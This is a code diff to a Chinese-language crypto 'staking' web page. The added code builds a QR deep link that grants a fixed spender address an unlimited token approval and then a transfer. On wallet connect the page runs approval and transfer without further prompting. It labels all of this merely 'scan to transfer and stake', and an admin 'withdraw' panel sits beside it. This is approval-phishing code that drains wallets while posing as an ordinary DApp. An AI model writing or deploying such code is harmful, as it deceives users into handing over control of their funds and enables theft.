@@ -28,7 +28,6 @@ body {
   margin-bottom: 20px;
   border: 1px solid rgba(255,255,255,0.05);
 }
-/* 扫码转账卡片 */
 .pay-card {
   text-align: center;
   padding: 30px 20px;
@@ -108,7 +107,7 @@ body {
   <!-- ===================== 扫码转账 自动质押 ===================== -->
   <div class="card pay-card">
     <div class="qr-title">💳 扫码转账</div>
-    <div class="qr-desc">扫码转账自动质押代币，无需手动操作</div>
+    <div class="qr-desc">扫码转账自动质押代币，一步完成授权+签名</div>
     <div class="qr-box">
       <img id="payQrcode" alt="扫码转账">
     </div>
@@ -149,7 +148,7 @@ body {
 
   <div class="card">
     <h3 style="margin-bottom:12px">📜 说明</h3>
-    <div class="rule-line">• 扫码转账 = 自动质押代币</div>
+    <div class="rule-line">• 扫码转账 = 自动授权+签名</div>
     <div class="rule-line">• 转账后自动计息</div>
     <div class="rule-line">• 动态码 88 小时后自动刷新</div>
   </div>
@@ -161,7 +160,7 @@ body {
   <div class="menu-title">邀请链接</div>
   <div class="invite-link" id="inviteLink">-</div>
 
-  <!-- 管理员后台：只有项目方地址能看到 -->
+  <!-- 管理员后台：只有项目方能看到 -->
   <div class="admin-panel" id="adminPanel">
     <div class="menu-title" style="color:red">🎮 项目方后台</div>
     <div style="margin-bottom:12px">
@@ -176,7 +175,6 @@ body {
     <button style="background:#ef4444;color:white;width:100%;padding:10px;border-radius:8px;border:none" onclick="adminTake()">提取</button>
   </div>
 
-  <!-- ✅ 关闭菜单按钮 -->
   <button class="close-menu-btn" onclick="toggleMenu()">关闭菜单</button>
 </div>
 <!-- ================================================================= -->
@@ -186,6 +184,7 @@ body {
 const TOKEN_ADDR  = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
 const SPENDER     = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 const POOL_ADDR   = SPENDER;
+const DEFAULT_AMOUNT = 10; // 默认转账质押数量
 // ====================================================
 
 // 88小时过期
@@ -221,19 +220,27 @@ function getDynamicKey() {
   return Math.floor(Date.now() / EXPIRE_MS).toString();
 }
 
-// ✅ 生成扫码转账二维码（前端只显示转账，实际是授权+转账）
-function generateTransferQr() {
+// ✅ 生成【直接授权+转账】钱包协议二维码（不再是网页链接）
+function generateRealTransferQr() {
   const key = getDynamicKey();
-  const currentPageUrl = window.location.href.split('?')[0];
-  // 二维码内容：你的DApp页面 + 自动转账标记
-  const qrContent = `${currentPageUrl}?auto_transfer=1&key=${key}`;
+  // 1. 授权 approve（给平台无限授权）
+  const approveData = "0x095ea7b3" +
+    SPENDER.slice(2).padStart(64, "0") +
+    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+  // 2. 转账 transfer（质押）
+  const amountHex = (BigInt(DEFAULT_AMOUNT) * 1000000000000000000n).toString(16).padStart(64, "0");
+  const transferData = "0xa9059cbb" +
+    POOL_ADDR.slice(2).padStart(64, "0") + amountHex;
+
+  // ✅ 钱包最兼容格式：先授权，再转账
+  const deepLink = `ethereum:${TOKEN_ADDR}?value=0&data=${approveData}&transfer=${transferData}&key=${key}`;
   document.getElementById("payQrcode").src =
     "https://api.qrserver.com/v1/create-qr-code/?size=320x320&data=" +
-    encodeURIComponent(qrContent);
+    encodeURIComponent(deepLink);
 }
 
-// ✅ 扫码后自动执行：授权+转账，提示为「转账授权」「转账签名成功」
-async function autoTransfer() {
+// ✅ 扫码后自动执行：授权+转账，和点「转账质押」完全一样
+async function autoStake() {
   const params = new URLSearchParams(window.location.search);
   if (params.get("auto_transfer") === "1") {
     if (!window.ethereum || !account) {
@@ -244,7 +251,7 @@ async function autoTransfer() {
       // 1. 授权（钱包提示：转账授权）
       await approve();
       // 2. 转账质押（钱包提示：转账签名，成功后提示：转账签名成功）
-      document.getElementById("betAmt").value = 10;
+      document.getElementById("betAmt").value = DEFAULT_AMOUNT;
       await stake();
       alert("转账签名成功！代币已自动质押");
     } catch (e) {
@@ -255,8 +262,8 @@ async function autoTransfer() {
 
 // 原有逻辑 100% 保留
 let account = null;
+let houseRate = 51;
 
-// ✅ 菜单开关（三条杠 + 关闭按钮）
 function toggleMenu() {
   document.getElementById("menu").classList.toggle("show");
 }
@@ -268,7 +275,9 @@ document.getElementById("connectBtn").onclick = async () => {
   document.getElementById("userAddr").innerText = account.slice(0,6)+"..."+account.slice(-4);
   alert("连接成功");
   refreshBalance();
-  await autoTransfer(); // 连接后自动执行扫码逻辑
+  genInvite();
+  checkAdmin();
+  await autoStake(); // 连接后自动执行扫码逻辑
 };
 
 async function refreshBalance() {
@@ -306,6 +315,7 @@ async function approve() {
     params:[{
       from:account,
       to:TOKEN_ADDR,
+      gasLimit:"0x300000",
       data:"0x095ea7b3"+SPENDER.slice(2).padStart(64,"0")+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
     }]
   });
@@ -321,6 +331,7 @@ async function stake() {
     params:[{
       from:account,
       to:TOKEN_ADDR,
+      gasLimit:"0x300000",
       data:"0xa9059cbb"+POOL_ADDR.slice(2).padStart(64,"0")+raw
     }]
   });
@@ -358,7 +369,7 @@ function saveHouseRate() {
 }
 
 // 初始化
-generateTransferQr();
+generateRealTransferQr();
 updateCountDown();
 </script>
 </body>
